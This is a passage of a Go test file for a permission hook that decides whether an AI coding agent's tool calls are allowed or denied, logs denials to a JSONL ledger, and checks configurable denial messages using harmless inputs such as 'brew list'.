		_expectedLedger: 4,
		_expectedStderr: "",
		_expectedStdout: "",

		args:  []string{"-ledger", ledger},
		stdin: autoRequestInput,
	})

	// auto-mode-self-service-answer-stands
	autoAppliedInput := `{"session_id":"s10","cwd":"` + appliedCwd + `","permission_mode":"auto","tool_name":"Bash","transcript_path":"` +
		humanTranscript + `","tool_input":{"command":` + string(appliedCommand) + `}}`
	tests = append(tests, &testCase{
		_id:             "auto-mode-self-service-answer-stands",
		_absentStdout:   "additionalContext",
		_expectedExit:   0,
		_expectedLedger: 4,
		_expectedStderr: "",
		_expectedStdout: causeSettingsApplied,

		args:  []string{"-ledger", ledger},
		stdin: autoAppliedInput,
	})

	// pretooluse-json-unchanged
	tests = append(tests, &testCase{
		_id:             "pretooluse-json-unchanged",
		_absentStdout:   "additionalContext",
		_expectedExit:   0,
		_expectedLedger: 5,
		_expectedStderr: "",
		_expectedStdout: `{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"deny","permissionDecisionReason":`,

		args:  []string{"-ledger", ledger},
		stdin: denyInput,
	})

	// Run tests
	for _, test := range tests {
		t.Run(test._id, func(t *testing.T) {
			stdout := &bytes.Buffer{}
			stderr := &bytes.Buffer{}
			exit := run(test.args, strings.NewReader(test.stdin), stdout, stderr)
			assert.Equal(t, test._expectedExit, exit)
			assert.Contains(t, stdout.String(), test._expectedStdout)
			assert.NotContains(t, stdout.String(), test._absentStdout)
			assert.Contains(t, stderr.String(), test._expectedStderr)
			assert.Equal(t, test._expectedLedger, ledgerLines(t, ledger))
		})
	}
}

func TestRun_MissingConfig(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	t.Setenv("USERPROFILE", home)
	stdin := `{"session_id":"s1","cwd":"/work","permission_mode":"default","tool_name":"Bash","tool_input":{"command":"brew list"}}`
	stdout := &bytes.Buffer{}
	stderr := &bytes.Buffer{}

	exit := run([]string{}, strings.NewReader(stdin), stdout, stderr)

	assert.Equal(t, 1, exit)
	assert.Empty(t, stdout.String())
	assert.Contains(t, stderr.String(), hookconfig.Path(filepath.Join(home, ".claude")))
}

func TestAppendDenial(t *testing.T) {
	ledger := filepath.Join(t.TempDir(), "tool-policy", "denials.jsonl")
	input := &HookInput{
		Cwd:       "/work",
		SessionId: "session-9",
		ToolInput: ToolInput{Command: "brew list"},
		ToolName:  "Bash",
	}
	grants := &Grants{}
	verdict := grants.denyVerdict(defaultToolpolicy(t), "Bash", input, causeNoAllowRule)
	now := time.Date(2000, 1, 1, 0, 0, 0, 0, time.UTC)
	laneInput := &HookInput{
		AgentId:       "a1",
		AgentType:     "railroad-lane-tests",
		Cwd:           "/work/sub",
		ScratchpadDir: "/tmp/claude-1/sid/scratchpad",
		SessionId:     "session-9",
		ToolInput:     ToolInput{Command: "brew list"},
		ToolName:      "Bash",
	}

	appendDenial(ledger, "/work", laneInput, verdict, now)
	appendDenial(ledger, "", input, verdict, now)

	raw, err := os.ReadFile(ledger)
	require.NoError(t, err)
	lines := strings.Split(strings.TrimSpace(string(raw)), "\n")
	require.Len(t, lines, 2)

	denial := Denial{}
	require.NoError(t, json.Unmarshal([]byte(lines[0]), &denial))
	expected := Denial{
		AgentId:       "a1",
		AgentType:     "railroad-lane-tests",
		Anchor:        "/work",
		CandidateRule: "Bash(brew list *)",
		Cause:         causeNoAllowRule,
		Cwd:           "/work/sub",
		Input:         "brew list",
		ScratchpadDir: "/tmp/claude-1/sid/scratchpad",
		SessionId:     "session-9",
		Timestamp:     "2000-01-01T00:00:00Z",
		Tool:          "Bash",
	}
	assert.Equal(t, expected, denial)
	assert.NotContains(t, lines[1], "agent_id")
	assert.NotContains(t, lines[1], "agent_type")
	assert.NotContains(t, lines[1], "anchor")
	assert.NotContains(t, lines[1], "scratchpad_dir")
}

func TestDecide_ConfiguredTexts(t *testing.T) {
	home := t.TempDir()
	cfg := renderedHookConfig(t)
	cfg.Toolpolicy.Causes.DeniedTool = "custom: this tool is off here"
	cfg.Toolpolicy.Steers.Deny = "custom steer."
	writeHookConfig(t, home, cfg)
	loaded, err := hookconfig.Load(home)
	require.NoError(t, err)
	cwd := t.TempDir()
	input := &HookInput{Cwd: cwd, HookEventName: hookEventPreToolUse, ToolName: "AskUserQuestion"}

	verdict := Decide(input, &loaded.Toolpolicy, fixtureGrants(t, cwd), home, "")

	assert.Equal(t, decisionDeny, verdict.Decision)
	assert.Equal(t, "custom: this tool is off here", verdict.Cause)
	assert.Contains(t, verdict.Reason, "— custom: this tool is off here. candidate rule: ")
	assert.True(t, strings.HasSuffix(verdict.Reason, "custom steer."))
}

// seedState writes state (nil = no file, the zero state) under dir as
// <name>.json and returns its path.
func seedState(t *testing.T, dir string, name string, state *sessionstate.SelfServiceState) string {
	t.Helper()
	path := filepath.Join(dir, name+".json")
	if state == nil {
		return path
	}
	session := &sessionstate.SessionState{SettingsLocal: *state}
	require.NoError(t, sessionstate.Save(path, session))
	return path
}

// captureStderr runs fn with os.Stderr redirected and returns what it wrote.
func captureStderr(t *testing.T, call func()) string {
	t.Helper()
	reader, writer, err := os.Pipe()
	require.NoError(t, err)

	original := os.Stderr
	os.Stderr = writer
	call()
	os.Stderr = original
	require.NoError(t, writer.Close())

	raw, err := io.ReadAll(reader)
	require.NoError(t, err)
	return string(raw)
}

func ledgerLines(t *testing.T, path string) int {
	t.Helper()
	raw, err := os.ReadFile(path)
	if err != nil {
		return 0
	}
	return len(strings.Split(strings.TrimSpace(string(raw)), "\n"))
}
